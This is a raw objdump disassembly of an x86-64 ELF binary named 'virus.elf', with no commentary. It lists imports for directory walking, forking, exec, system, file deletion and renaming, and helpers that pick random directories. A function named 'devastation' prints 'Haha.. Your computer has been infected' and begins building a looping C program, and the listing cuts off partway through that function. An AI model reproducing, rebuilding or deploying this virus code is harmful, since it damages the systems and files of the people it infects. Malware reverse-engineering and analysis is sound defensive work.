
virus.elf:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 <_init>:
    1000:	f3 0f 1e fa          	endbr64 
    10c4:	68 09 00 00 00       	push   0x9
    10c9:	f2 e9 51 ff ff ff    	bnd jmp 1020 <.plt>
    10cf:	90                   	nop
    10d0:	f3 0f 1e fa          	endbr64 
    10d4:	68 0a 00 00 00       	push   0xa
    10d9:	f2 e9 41 ff ff ff    	bnd jmp 1020 <.plt>
    10df:	90                   	nop
    10e0:	f3 0f 1e fa          	endbr64 
    10e4:	68 0b 00 00 00       	push   0xb
    10e9:	f2 e9 31 ff ff ff    	bnd jmp 1020 <.plt>
    10ef:	90                   	nop
    10f0:	f3 0f 1e fa          	endbr64 
    10f4:	68 0c 00 00 00       	push   0xc
    10f9:	f2 e9 21 ff ff ff    	bnd jmp 1020 <.plt>
    10ff:	90                   	nop
    1100:	f3 0f 1e fa          	endbr64 
    1104:	68 0d 00 00 00       	push   0xd
    1109:	f2 e9 11 ff ff ff    	bnd jmp 1020 <.plt>
    110f:	90                   	nop
    1110:	f3 0f 1e fa          	endbr64 
    1114:	68 0e 00 00 00       	push   0xe
    1119:	f2 e9 01 ff ff ff    	bnd jmp 1020 <.plt>
    111f:	90                   	nop
    1120:	f3 0f 1e fa          	endbr64 
    1124:	68 0f 00 00 00       	push   0xf
    1129:	f2 e9 f1 fe ff ff    	bnd jmp 1020 <.plt>
    112f:	90                   	nop
    1130:	f3 0f 1e fa          	endbr64 
    1134:	68 10 00 00 00       	push   0x10
    1139:	f2 e9 e1 fe ff ff    	bnd jmp 1020 <.plt>
    113f:	90                   	nop
    1140:	f3 0f 1e fa          	endbr64 
    1144:	68 11 00 00 00       	push   0x11
    1149:	f2 e9 d1 fe ff ff    	bnd jmp 1020 <.plt>
    114f:	90                   	nop
    1150:	f3 0f 1e fa          	endbr64 
    1154:	68 12 00 00 00       	push   0x12
    1159:	f2 e9 c1 fe ff ff    	bnd jmp 1020 <.plt>
    115f:	90                   	nop
    1160:	f3 0f 1e fa          	endbr64 
    1164:	68 13 00 00 00       	push   0x13
    1169:	f2 e9 b1 fe ff ff    	bnd jmp 1020 <.plt>
    116f:	90                   	nop
    1170:	f3 0f 1e fa          	endbr64 
    1174:	68 14 00 00 00       	push   0x14
    1179:	f2 e9 a1 fe ff ff    	bnd jmp 1020 <.plt>
    117f:	90                   	nop
    1180:	f3 0f 1e fa          	endbr64 
    1184:	68 15 00 00 00       	push   0x15
    1189:	f2 e9 91 fe ff ff    	bnd jmp 1020 <.plt>
    118f:	90                   	nop
    1190:	f3 0f 1e fa          	endbr64 
    1194:	68 16 00 00 00       	push   0x16
    1199:	f2 e9 81 fe ff ff    	bnd jmp 1020 <.plt>
    119f:	90                   	nop
    11a0:	f3 0f 1e fa          	endbr64 
    11a4:	68 17 00 00 00       	push   0x17
    11a9:	f2 e9 71 fe ff ff    	bnd jmp 1020 <.plt>
    11af:	90                   	nop
    11b0:	f3 0f 1e fa          	endbr64 
    11b4:	68 18 00 00 00       	push   0x18
    11b9:	f2 e9 61 fe ff ff    	bnd jmp 1020 <.plt>
    11bf:	90                   	nop
    11c0:	f3 0f 1e fa          	endbr64 
    11c4:	68 19 00 00 00       	push   0x19
    11c9:	f2 e9 51 fe ff ff    	bnd jmp 1020 <.plt>
    11cf:	90                   	nop
    11d0:	f3 0f 1e fa          	endbr64 
    11d4:	68 1a 00 00 00       	push   0x1a
    11d9:	f2 e9 41 fe ff ff    	bnd jmp 1020 <.plt>
    11df:	90                   	nop
    11e0:	f3 0f 1e fa          	endbr64 
    11e4:	68 1b 00 00 00       	push   0x1b
    11e9:	f2 e9 31 fe ff ff    	bnd jmp 1020 <.plt>
    11ef:	90                   	nop
    11f0:	f3 0f 1e fa          	endbr64 
    11f4:	68 1c 00 00 00       	push   0x1c
    11f9:	f2 e9 21 fe ff ff    	bnd jmp 1020 <.plt>
    11ff:	90                   	nop
    1200:	f3 0f 1e fa          	endbr64 
    1204:	68 1d 00 00 00       	push   0x1d
    1209:	f2 e9 11 fe ff ff    	bnd jmp 1020 <.plt>
    120f:	90                   	nop
    1210:	f3 0f 1e fa          	endbr64 
    1214:	68 1e 00 00 00       	push   0x1e
    1219:	f2 e9 01 fe ff ff    	bnd jmp 1020 <.plt>
    121f:	90                   	nop
    1220:	f3 0f 1e fa          	endbr64 
    1224:	68 1f 00 00 00       	push   0x1f
    1229:	f2 e9 f1 fd ff ff    	bnd jmp 1020 <.plt>
    122f:	90                   	nop
    1230:	f3 0f 1e fa          	endbr64 
    1234:	68 20 00 00 00       	push   0x20
    1239:	f2 e9 e1 fd ff ff    	bnd jmp 1020 <.plt>
    123f:	90                   	nop
    1240:	f3 0f 1e fa          	endbr64 
    1244:	68 21 00 00 00       	push   0x21
    1249:	f2 e9 d1 fd ff ff    	bnd jmp 1020 <.plt>
    124f:	90                   	nop
    1250:	f3 0f 1e fa          	endbr64 
    1254:	68 22 00 00 00       	push   0x22
    1259:	f2 e9 c1 fd ff ff    	bnd jmp 1020 <.plt>
    125f:	90                   	nop
    1260:	f3 0f 1e fa          	endbr64 
    1264:	68 23 00 00 00       	push   0x23
    1269:	f2 e9 b1 fd ff ff    	bnd jmp 1020 <.plt>
    126f:	90                   	nop
    1270:	f3 0f 1e fa          	endbr64 
    1274:	68 24 00 00 00       	push   0x24
    1279:	f2 e9 a1 fd ff ff    	bnd jmp 1020 <.plt>
    127f:	90                   	nop

Disassembly of section .plt.got:

0000000000001280 <__cxa_finalize@plt>:
    1280:	f3 0f 1e fa          	endbr64 
    1284:	f2 ff 25 6d 3d 00 00 	bnd jmp QWORD PTR [rip+0x3d6d]        # 4ff8 <__cxa_finalize@GLIBC_2.2.5>
    128b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .plt.sec:

0000000000001290 <localtime@plt>:
    1290:	f3 0f 1e fa          	endbr64 
    1294:	f2 ff 25 15 3c 00 00 	bnd jmp QWORD PTR [rip+0x3c15]        # 4eb0 <localtime@GLIBC_2.2.5>
    129b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000012a0 <unlink@plt>:
    12a0:	f3 0f 1e fa          	endbr64 
    12a4:	f2 ff 25 0d 3c 00 00 	bnd jmp QWORD PTR [rip+0x3c0d]        # 4eb8 <unlink@GLIBC_2.2.5>
    12ab:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000012b0 <remove@plt>:
    12b0:	f3 0f 1e fa          	endbr64 
    12b4:	f2 ff 25 05 3c 00 00 	bnd jmp QWORD PTR [rip+0x3c05]        # 4ec0 <remove@GLIBC_2.2.5>
    12bb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000012c0 <strcpy@plt>:
    12c0:	f3 0f 1e fa          	endbr64 
    12c4:	f2 ff 25 fd 3b 00 00 	bnd jmp QWORD PTR [rip+0x3bfd]        # 4ec8 <strcpy@GLIBC_2.2.5>
    12cb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000012d0 <puts@plt>:
    12d0:	f3 0f 1e fa          	endbr64 
    12d4:	f2 ff 25 f5 3b 00 00 	bnd jmp QWORD PTR [rip+0x3bf5]        # 4ed0 <puts@GLIBC_2.2.5>
    12db:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000012e0 <write@plt>:
    12e0:	f3 0f 1e fa          	endbr64 
    12e4:	f2 ff 25 ed 3b 00 00 	bnd jmp QWORD PTR [rip+0x3bed]        # 4ed8 <write@GLIBC_2.2.5>
    12eb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000012f0 <opendir@plt>:
    12f0:	f3 0f 1e fa          	endbr64 
    12f4:	f2 ff 25 e5 3b 00 00 	bnd jmp QWORD PTR [rip+0x3be5]        # 4ee0 <opendir@GLIBC_2.2.5>
    12fb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001300 <__stack_chk_fail@plt>:
    1300:	f3 0f 1e fa          	endbr64 
    1304:	f2 ff 25 dd 3b 00 00 	bnd jmp QWORD PTR [rip+0x3bdd]        # 4ee8 <__stack_chk_fail@GLIBC_2.4>
    130b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001310 <getuid@plt>:
    1310:	f3 0f 1e fa          	endbr64 
    1314:	f2 ff 25 d5 3b 00 00 	bnd jmp QWORD PTR [rip+0x3bd5]        # 4ef0 <getuid@GLIBC_2.2.5>
    131b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001320 <mmap@plt>:
    1320:	f3 0f 1e fa          	endbr64 
    1324:	f2 ff 25 cd 3b 00 00 	bnd jmp QWORD PTR [rip+0x3bcd]        # 4ef8 <mmap@GLIBC_2.2.5>
    132b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001330 <system@plt>:
    1330:	f3 0f 1e fa          	endbr64 
    1334:	f2 ff 25 c5 3b 00 00 	bnd jmp QWORD PTR [rip+0x3bc5]        # 4f00 <system@GLIBC_2.2.5>
    133b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001340 <printf@plt>:
    1340:	f3 0f 1e fa          	endbr64 
    1344:	f2 ff 25 bd 3b 00 00 	bnd jmp QWORD PTR [rip+0x3bbd]        # 4f08 <printf@GLIBC_2.2.5>
    134b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001350 <snprintf@plt>:
    1350:	f3 0f 1e fa          	endbr64 
    1354:	f2 ff 25 b5 3b 00 00 	bnd jmp QWORD PTR [rip+0x3bb5]        # 4f10 <snprintf@GLIBC_2.2.5>
    135b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001360 <lseek@plt>:
    1360:	f3 0f 1e fa          	endbr64 
    1364:	f2 ff 25 ad 3b 00 00 	bnd jmp QWORD PTR [rip+0x3bad]        # 4f18 <lseek@GLIBC_2.2.5>
    136b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001370 <close@plt>:
    1370:	f3 0f 1e fa          	endbr64 
    1374:	f2 ff 25 a5 3b 00 00 	bnd jmp QWORD PTR [rip+0x3ba5]        # 4f20 <close@GLIBC_2.2.5>
    137b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001380 <closedir@plt>:
    1380:	f3 0f 1e fa          	endbr64 
    1384:	f2 ff 25 9d 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b9d]        # 4f28 <closedir@GLIBC_2.2.5>
    138b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001390 <read@plt>:
    1390:	f3 0f 1e fa          	endbr64 
    1394:	f2 ff 25 95 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b95]        # 4f30 <read@GLIBC_2.2.5>
    139b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000013a0 <srand@plt>:
    13a0:	f3 0f 1e fa          	endbr64 
    13a4:	f2 ff 25 8d 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b8d]        # 4f38 <srand@GLIBC_2.2.5>
    13ab:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000013b0 <strcmp@plt>:
    13b0:	f3 0f 1e fa          	endbr64 
    13b4:	f2 ff 25 85 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b85]        # 4f40 <strcmp@GLIBC_2.2.5>
    13bb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000013c0 <realpath@plt>:
    13c0:	f3 0f 1e fa          	endbr64 
    13c4:	f2 ff 25 7d 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b7d]        # 4f48 <realpath@GLIBC_2.3>
    13cb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000013d0 <time@plt>:
    13d0:	f3 0f 1e fa          	endbr64 
    13d4:	f2 ff 25 75 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b75]        # 4f50 <time@GLIBC_2.2.5>
    13db:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000013e0 <__xstat@plt>:
    13e0:	f3 0f 1e fa          	endbr64 
    13e4:	f2 ff 25 6d 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b6d]        # 4f58 <__xstat@GLIBC_2.2.5>
    13eb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000013f0 <readdir@plt>:
    13f0:	f3 0f 1e fa          	endbr64 
    13f4:	f2 ff 25 65 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b65]        # 4f60 <readdir@GLIBC_2.2.5>
    13fb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001400 <__fxstat@plt>:
    1400:	f3 0f 1e fa          	endbr64 
    1404:	f2 ff 25 5d 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b5d]        # 4f68 <__fxstat@GLIBC_2.2.5>
    140b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001410 <sendfile@plt>:
    1410:	f3 0f 1e fa          	endbr64 
    1414:	f2 ff 25 55 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b55]        # 4f70 <sendfile@GLIBC_2.2.5>
    141b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001420 <munmap@plt>:
    1420:	f3 0f 1e fa          	endbr64 
    1424:	f2 ff 25 4d 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b4d]        # 4f78 <munmap@GLIBC_2.2.5>
    142b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001430 <waitpid@plt>:
    1430:	f3 0f 1e fa          	endbr64 
    1434:	f2 ff 25 45 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b45]        # 4f80 <waitpid@GLIBC_2.2.5>
    143b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001440 <open@plt>:
    1440:	f3 0f 1e fa          	endbr64 
    1444:	f2 ff 25 3d 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b3d]        # 4f88 <open@GLIBC_2.2.5>
    144b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001450 <cuserid@plt>:
    1450:	f3 0f 1e fa          	endbr64 
    1454:	f2 ff 25 35 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b35]        # 4f90 <cuserid@GLIBC_2.2.5>
    145b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001460 <rename@plt>:
    1460:	f3 0f 1e fa          	endbr64 
    1464:	f2 ff 25 2d 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b2d]        # 4f98 <rename@GLIBC_2.2.5>
    146b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001470 <execvp@plt>:
    1470:	f3 0f 1e fa          	endbr64 
    1474:	f2 ff 25 25 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b25]        # 4fa0 <execvp@GLIBC_2.2.5>
    147b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001480 <strcat@plt>:
    1480:	f3 0f 1e fa          	endbr64 
    1484:	f2 ff 25 1d 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b1d]        # 4fa8 <strcat@GLIBC_2.2.5>
    148b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001490 <creat@plt>:
    1490:	f3 0f 1e fa          	endbr64 
    1494:	f2 ff 25 15 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b15]        # 4fb0 <creat@GLIBC_2.2.5>
    149b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000014a0 <sleep@plt>:
    14a0:	f3 0f 1e fa          	endbr64 
    14a4:	f2 ff 25 0d 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b0d]        # 4fb8 <sleep@GLIBC_2.2.5>
    14ab:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000014b0 <execv@plt>:
    14b0:	f3 0f 1e fa          	endbr64 
    14b4:	f2 ff 25 05 3b 00 00 	bnd jmp QWORD PTR [rip+0x3b05]        # 4fc0 <execv@GLIBC_2.2.5>
    14bb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000014c0 <fork@plt>:
    14c0:	f3 0f 1e fa          	endbr64 
    14c4:	f2 ff 25 fd 3a 00 00 	bnd jmp QWORD PTR [rip+0x3afd]        # 4fc8 <fork@GLIBC_2.2.5>
    14cb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000014d0 <rand@plt>:
    14d0:	f3 0f 1e fa          	endbr64 
    14d4:	f2 ff 25 f5 3a 00 00 	bnd jmp QWORD PTR [rip+0x3af5]        # 4fd0 <rand@GLIBC_2.2.5>
    14db:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .text:

00000000000014e0 <_start>:
    14e0:	f3 0f 1e fa          	endbr64 
    14e4:	31 ed                	xor    ebp,ebp
    14e6:	49 89 d1             	mov    r9,rdx
    14e9:	5e                   	pop    rsi
    14ea:	48 89 e2             	mov    rdx,rsp
    14ed:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
    14f1:	50                   	push   rax
    14f2:	54                   	push   rsp
    14f3:	4c 8d 05 86 12 00 00 	lea    r8,[rip+0x1286]        # 2780 <__libc_csu_fini>
    14fa:	48 8d 0d 0f 12 00 00 	lea    rcx,[rip+0x120f]        # 2710 <__libc_csu_init>
    1501:	48 8d 3d 49 0f 00 00 	lea    rdi,[rip+0xf49]        # 2451 <main>
    1508:	ff 15 d2 3a 00 00    	call   QWORD PTR [rip+0x3ad2]        # 4fe0 <__libc_start_main@GLIBC_2.2.5>
    150e:	f4                   	hlt    
    150f:	90                   	nop

0000000000001510 <deregister_tm_clones>:
    1510:	48 8d 3d f9 3a 00 00 	lea    rdi,[rip+0x3af9]        # 5010 <__TMC_END__>
    1517:	48 8d 05 f2 3a 00 00 	lea    rax,[rip+0x3af2]        # 5010 <__TMC_END__>
    151e:	48 39 f8             	cmp    rax,rdi
    1521:	74 15                	je     1538 <deregister_tm_clones+0x28>
    1523:	48 8b 05 ae 3a 00 00 	mov    rax,QWORD PTR [rip+0x3aae]        # 4fd8 <_ITM_deregisterTMCloneTable>
    152a:	48 85 c0             	test   rax,rax
    152d:	74 09                	je     1538 <deregister_tm_clones+0x28>
    152f:	ff e0                	jmp    rax
    1531:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
    1538:	c3                   	ret    
    1539:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

0000000000001540 <register_tm_clones>:
    1540:	48 8d 3d c9 3a 00 00 	lea    rdi,[rip+0x3ac9]        # 5010 <__TMC_END__>
    1547:	48 8d 35 c2 3a 00 00 	lea    rsi,[rip+0x3ac2]        # 5010 <__TMC_END__>
    154e:	48 29 fe             	sub    rsi,rdi
    1551:	48 89 f0             	mov    rax,rsi
    1554:	48 c1 ee 3f          	shr    rsi,0x3f
    1558:	48 c1 f8 03          	sar    rax,0x3
    155c:	48 01 c6             	add    rsi,rax
    155f:	48 d1 fe             	sar    rsi,1
    1562:	74 14                	je     1578 <register_tm_clones+0x38>
    1564:	48 8b 05 85 3a 00 00 	mov    rax,QWORD PTR [rip+0x3a85]        # 4ff0 <_ITM_registerTMCloneTable>
    156b:	48 85 c0             	test   rax,rax
    156e:	74 08                	je     1578 <register_tm_clones+0x38>
    1570:	ff e0                	jmp    rax
    1572:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
    1578:	c3                   	ret    
    1579:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

0000000000001580 <__do_global_dtors_aux>:
    1580:	f3 0f 1e fa          	endbr64 
    1584:	80 3d 85 3a 00 00 00 	cmp    BYTE PTR [rip+0x3a85],0x0        # 5010 <__TMC_END__>
    158b:	75 2b                	jne    15b8 <__do_global_dtors_aux+0x38>
    158d:	55                   	push   rbp
    158e:	48 83 3d 62 3a 00 00 	cmp    QWORD PTR [rip+0x3a62],0x0        # 4ff8 <__cxa_finalize@GLIBC_2.2.5>
    1595:	00 
    1596:	48 89 e5             	mov    rbp,rsp
    1599:	74 0c                	je     15a7 <__do_global_dtors_aux+0x27>
    159b:	48 8b 3d 66 3a 00 00 	mov    rdi,QWORD PTR [rip+0x3a66]        # 5008 <__dso_handle>
    15a2:	e8 d9 fc ff ff       	call   1280 <__cxa_finalize@plt>
    15a7:	e8 64 ff ff ff       	call   1510 <deregister_tm_clones>
    15ac:	c6 05 5d 3a 00 00 01 	mov    BYTE PTR [rip+0x3a5d],0x1        # 5010 <__TMC_END__>
    15b3:	5d                   	pop    rbp
    15b4:	c3                   	ret    
    15b5:	0f 1f 00             	nop    DWORD PTR [rax]
    15b8:	c3                   	ret    
    15b9:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

00000000000015c0 <frame_dummy>:
    15c0:	f3 0f 1e fa          	endbr64 
    15c4:	e9 77 ff ff ff       	jmp    1540 <register_tm_clones>

00000000000015c9 <get_random_number>:
    15c9:	55                   	push   rbp
    15ca:	48 89 e5             	mov    rbp,rsp
    15cd:	48 83 ec 10          	sub    rsp,0x10
    15d1:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi
    15d4:	e8 f7 fe ff ff       	call   14d0 <rand@plt>
    15d9:	99                   	cdq    
    15da:	c1 ea 1e             	shr    edx,0x1e
    15dd:	01 d0                	add    eax,edx
    15df:	83 e0 03             	and    eax,0x3
    15e2:	29 d0                	sub    eax,edx
    15e4:	c9                   	leave  
    15e5:	c3                   	ret    

00000000000015e6 <randomly_select_dir>:
    15e6:	55                   	push   rbp
    15e7:	48 89 e5             	mov    rbp,rsp
    15ea:	48 83 ec 10          	sub    rsp,0x10
    15ee:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
    15f2:	bf 04 00 00 00       	mov    edi,0x4
    15f7:	e8 cd ff ff ff       	call   15c9 <get_random_number>
    15fc:	48 98                	cdqe   
    15fe:	48 8d 14 c5 00 00 00 	lea    rdx,[rax*8+0x0]
    1605:	00 
    1606:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    160a:	48 01 d0             	add    rax,rdx
    160d:	48 8b 00             	mov    rax,QWORD PTR [rax]
    1610:	c9                   	leave  
    1611:	c3                   	ret    

0000000000001612 <devastation>:
    1612:	f3 0f 1e fa          	endbr64 
    1616:	55                   	push   rbp
    1617:	48 89 e5             	mov    rbp,rsp
    161a:	48 81 ec f0 02 00 00 	sub    rsp,0x2f0
    1621:	48 89 bd 18 fd ff ff 	mov    QWORD PTR [rbp-0x2e8],rdi
    1628:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    162f:	00 00 
    1631:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    1635:	31 c0                	xor    eax,eax
    1637:	48 b8 48 61 68 61 2e 	movabs rax,0x59202e2e61686148
    163e:	2e 20 59 
    1641:	48 ba 6f 75 72 20 63 	movabs rdx,0x706d6f632072756f
    1648:	6f 6d 70 
    164b:	48 89 85 60 fd ff ff 	mov    QWORD PTR [rbp-0x2a0],rax
    1652:	48 89 95 68 fd ff ff 	mov    QWORD PTR [rbp-0x298],rdx
    1659:	48 b8 75 74 65 72 20 	movabs rax,0x7361682072657475
    1660:	68 61 73 
    1663:	48 ba 20 62 65 65 6e 	movabs rdx,0x6e69206e65656220
    166a:	20 69 6e 
    166d:	48 89 85 70 fd ff ff 	mov    QWORD PTR [rbp-0x290],rax
    1674:	48 89 95 78 fd ff ff 	mov    QWORD PTR [rbp-0x288],rdx
    167b:	48 b8 66 65 63 74 65 	movabs rax,0xa646574636566
    1682:	64 0a 00 
    1685:	48 89 85 80 fd ff ff 	mov    QWORD PTR [rbp-0x280],rax
    168c:	48 8d 85 60 fd ff ff 	lea    rax,[rbp-0x2a0]
    1693:	ba 28 00 00 00       	mov    edx,0x28
    1698:	48 89 c6             	mov    rsi,rax
    169b:	bf 01 00 00 00       	mov    edi,0x1
    16a0:	e8 3b fc ff ff       	call   12e0 <write@plt>
    16a5:	48 b8 6d 61 69 6e 28 	movabs rax,0x777b29286e69616d
    16ac:	29 7b 77 
    16af:	48 ba 68 69 6c 65 28 	movabs rdx,0x3b293128656c6968
    16b6:	31 29 3b 
    16b9:	48 89 85 40 fd ff ff 	mov    QWORD PTR [rbp-0x2c0],rax
    16c0:	48 89 95 48 fd ff ff 	mov    QWORD PTR [rbp-0x2b8],rdx
